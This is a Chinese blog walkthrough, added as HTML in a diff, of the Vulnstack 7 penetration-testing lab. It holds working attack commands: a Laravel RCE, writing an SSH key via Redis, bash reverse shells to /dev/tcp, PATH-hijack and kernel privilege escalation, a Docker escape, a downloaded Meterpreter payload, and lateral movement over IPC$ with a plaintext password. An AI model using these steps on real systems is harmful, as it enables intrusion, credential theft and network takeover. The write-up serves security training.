@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Vulnstack红日靶场7 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Vulnstack红日靶场7</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-11-17 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Vulnstack红日靶场7"><a href="#Vulnstack红日靶场7" class="headerlink" title="Vulnstack红日靶场7"></a>Vulnstack红日靶场7</h1><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p>靶场地址:<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></p>
+<p><img src="/posts/a56ee1fe/1614336174_6038d0ae97a56a0f1e287.png" alt="img"></p>
+<h3 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h3><p>DMZ区的 Ubuntu 需要启动redis和nginx服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root启动</span></span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line">iptables -F</span><br></pre></td></tr></table></figure>
+
+<p>第二层网络的 Ubuntu需要启动docker容器：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root启动</span></span><br><span class="line">service docker start</span><br><span class="line">docker start 8e172820ac78</span><br></pre></td></tr></table></figure>
+
+<p>第二层网络的 Windows 7 （PC 1）需要启动通达OA</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">administrator启动，关闭防火墙</span></span><br><span class="line">C:\MYOA\bin\AutoConfig.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>直接访问192.168.118.138<br><img src="/posts/a56ee1fe/image-20221107095051360.png" alt="image-20221107095051360"><br>是个404,扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.118.138 -p 1-65535</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107095200252.png" alt="image-20221107095200252"></p>
+<p>有个81和6379的redis<br>81是一个Laravel<br><img src="/posts/a56ee1fe/image-20221107095240654.png" alt="image-20221107095240654"><br>版本是v8.29.0可以用CVE-2021-3129 RCE打<br><a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a><br><img src="/posts/a56ee1fe/image-20221107100549500.png" alt="image-20221107100549500"><br>用哥斯拉连接<br><strong>注意：</strong>要用2.9.6之前的哥斯拉 <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla/releases">https://github.com/BeichenDream/Godzilla/releases</a><br><img src="/posts/a56ee1fe/image-20221107100940567.png" alt="image-20221107100940567"><br>连接上shell先判断是否在docker里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /.dockerenv</span><br><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107101359457.png" alt="image-20221107101359457"><br>确实是docker<br>先把shell弹到kali上操作</p>
+<p><img src="/posts/a56ee1fe/image-20221107105743486.png" alt="image-20221107105743486"><br>没有任何反应……<br>这条思路断了去看看6379的redis<br><img src="/posts/a56ee1fe/image-20221107105952642.png" alt="image-20221107105952642"><br>未授权直接连上<br>尝试能不能写ssh-key</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat key.txt | redis-cli -h 192.168.118.138 -p 6379 -x set shell</span><br><span class="line">redis-cli -h 192.168.118.138</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107110734745.png" alt="image-20221107110734745"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107110855551.png" alt="image-20221107110855551"><br>ssh尝试连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.118.138</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107111013358.png" alt="image-20221107111013358"><br>root权限成功连接<br>接下来看下nginx的配置为什么刚才的反弹shell没有成功<br><img src="/posts/a56ee1fe/image-20221107111505609.png" alt="image-20221107111505609"><br>破案了，81端口是52.20主机做的反向代理<br>既然这样那就将shell反弹到52.10主机然后再操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.52.10/1234 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107112745207.png" alt="image-20221107112745207"><br>低权限,先提权，先试下suid</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107112939255.png" alt="image-20221107112939255"><br>有一个shell很奇怪,切换目录执行一下<br><img src="/posts/a56ee1fe/image-20221107113318314.png" alt="image-20221107113318314"><br>执行了一个ps命令<br>目录下面还有个demo.c，应该是shell的原代码<br><img src="/posts/a56ee1fe/image-20221107122847940.png" alt="image-20221107122847940"><br>可以看到ps是直接调用环境变量$PATH中的ps那么就可以在$PATH中做文章了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;tmp目录下创建一个ps内容为<code>/bin/bash</code>并给个执行权限，同时把tmp写进环境变量，那么在执行ps时就会优先调用&#x2F;tmp下的ps</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107123602347.png" alt="image-20221107123602347"><br>提权成功<br>再次反弹shell到52.10</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/7890 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107150648627.png" alt="image-20221107150648627"><br>接下来要想办法进行docker逃逸了<br>利用特权模式进行docker逃逸</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l 	#查看磁盘文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107152746001.png" alt="image-20221107152746001"><br>创建一个文件夹来挂载磁盘</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir shell</span><br><span class="line">mount /dev/sda1 /shell</span><br><span class="line">ls /shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107155628816.png" alt="image-20221107155628816"><br>看看能不能继续利用ssh_key<br>先看一下home下有那些用户<br><img src="/posts/a56ee1fe/image-20221107163003684.png" alt="image-20221107163003684"><br>就在看ubuntu下面的文件时突然发现了惊喜<br><img src="/posts/a56ee1fe/image-20221107163038489.png" alt="image-20221107163038489"><br>查看文件直接读取到了ubuntu的密码</p>
+<p><img src="/posts/a56ee1fe/image-20221107163109221.png" alt="image-20221107163109221"><br>这下直接用52.10的ssh连接就好了<br><img src="/posts/a56ee1fe/image-20221107163345812.png" alt="image-20221107163345812"><br>这里只是一个普通用户权限还要提一下权限<br>利用<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a><br>本地创建一个exp.c然后把代码复制进来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">vim exploit.c</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107171825431.png" alt="image-20221107171825431"><br>提权成功<br>现在已经拿下两个主机了先把他们上线msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.136 LPORT=4445 -f elf &gt; /root/ubuntu.elf</span><br></pre></td></tr></table></figure>
+
+<p>生成完成后kali开启web服务<br>52.10下载木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.31.136/ubuntu.elf</span><br></pre></td></tr></table></figure>
+
+<p>开启监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4445</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107194301510.png" alt="image-20221107194301510"><br>52.10成功上线<br>添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221107194450241.png" alt="image-20221107194450241"><br>52.20也是出网直接利用<br><img src="/posts/a56ee1fe/image-20221108205845363.png" alt="image-20221108205845363"><br><img src="/posts/a56ee1fe/image-20221108210643248.png" alt="image-20221108210643248"><br>这里52.20不是root权限是因为前面提到root手贱关机了 然后再重新尝试时exp疯狂报错……<br>不影响后续渗透<br>52.20添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221108211210182.png" alt="image-20221108211210182"><br>发现多了一个93网段<br>先扫一下52网段还有没有主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.52.1-255</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221108211838117.png" alt="image-20221108211838117"><br>扫到一台30<br>web1开一个socks代理看下是什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 192.168.31.187</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221108213636816.png" alt="image-20221108213636816"><br>是一个oa系统<br>proxifier建立代理oa利用工具<br><img src="/posts/a56ee1fe/image-20221108215720078.png" alt="image-20221108215720078"><br><img src="/posts/a56ee1fe/image-20221108215846960.png" alt="image-20221108215846960"><br>52网段是出网的可以直接上线cs</p>
+<p><img src="/posts/a56ee1fe/image-20221108220509708.png" alt="image-20221108220509708"><br><img src="/posts/a56ee1fe/image-20221108220547063.png" alt="image-20221108220547063"></p>
+<p>扫描93网段<br><img src="/posts/a56ee1fe/image-20221108220703180.png" alt="image-20221108220703180"></p>
+<p><img src="/posts/a56ee1fe/image-20221108221204395.png" alt="image-20221108221204395"><br>抓取密码<br><img src="/posts/a56ee1fe/image-20221108221525818.png" alt="image-20221108221525818"><br>既然抓到密码了可以利用smb横向</p>
+<p><img src="/posts/a56ee1fe/image-20221108223016151.png" alt="image-20221108223016151"></p>
+<p>还可以利用ipc通道把马子传到域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.30\ipc$ &quot;Whoami2021&quot; /user:&quot;administrator&quot;</span><br><span class="line">copy C:\MYOA\webroot\beacon.exe \\192.168.93.30\c$</span><br></pre></td></tr></table></figure>
+
+<p>然后利用改成smb得到的shell执行文件，或者利用ipc添加定时任务<br>DC不出网要利用转发上线,PC1建立转发上线监听然后生成马子利用上面的方法传到域控然后上线</p>
+<p><img src="/posts/a56ee1fe/image-20221108224648343.png" alt="image-20221108224648343"><br>对于PC2也是一样的步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.40\ipc$ &quot;Whoami2021&quot; /user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a56ee1fe/image-20221108225012991.png" alt="image-20221108225012991"><img src="/posts/a56ee1fe/image-20221108225323892.png" alt="image-20221108225323892"></p>
+<p>全部拿下</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/4c0d44cb/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-11-17 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7"><span class="toc-text">Vulnstack红日靶场7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91"><span class="toc-text">环境拓扑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE"><span class="toc-text">服务配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Fa56ee1fe%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/a56ee1fe/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
